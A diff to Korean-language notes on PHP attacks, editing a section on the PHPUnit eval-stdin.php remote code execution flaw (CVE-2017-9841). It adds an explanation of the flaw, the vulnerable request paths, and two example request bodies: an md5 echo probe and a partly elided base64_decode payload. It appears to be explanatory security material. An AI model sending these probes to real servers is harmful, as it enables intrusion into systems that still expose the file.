@@ -419,6 +419,8 @@ create_function(post(2), post(3))
 ## 📎 예제 4. `phpunit`의 eval-stdin.php
 
 **PHPUnit RCE 취약점(CVE-2017-9841)**
+: PHPUnit 패키지 내부에 포함된 eval-stdin.php 파일이
+외부에서 접근 가능할 경우 STDIN 내용 전체를 PHP 코드로 eval() 실행함.
 
 요청 경로:
 
@@ -426,7 +428,7 @@ create_function(post(2), post(3))
 /laravel71/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 ```
 
-→ 공격자는 다음 URL로 접근하여 임의 PHP 코드를 실행할 수 있었습니다
+→ 공격자는 다음 URL로 접근하여 임의 PHP 코드를 실행할 수 있습니다
 
 ```
 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
@@ -437,7 +439,7 @@ create_function(post(2), post(3))
 
 <br>
 
-요청 내용:
+요청 예시 (1)
 
 ```php
 <?php echo md5('sampariopm'); ?>
@@ -451,3 +453,9 @@ create_function(post(2), post(3))
 * 공격자가 응답만 보고 RCE 성공 여부를 즉시 파악 가능
 * 서버 로그에도 흔적이 거의 남지 않음
 
+
+요청 예시 (2)
+
+```php
+<? … base64_decode("bWVtZWtjaW5h"); ?>
+```
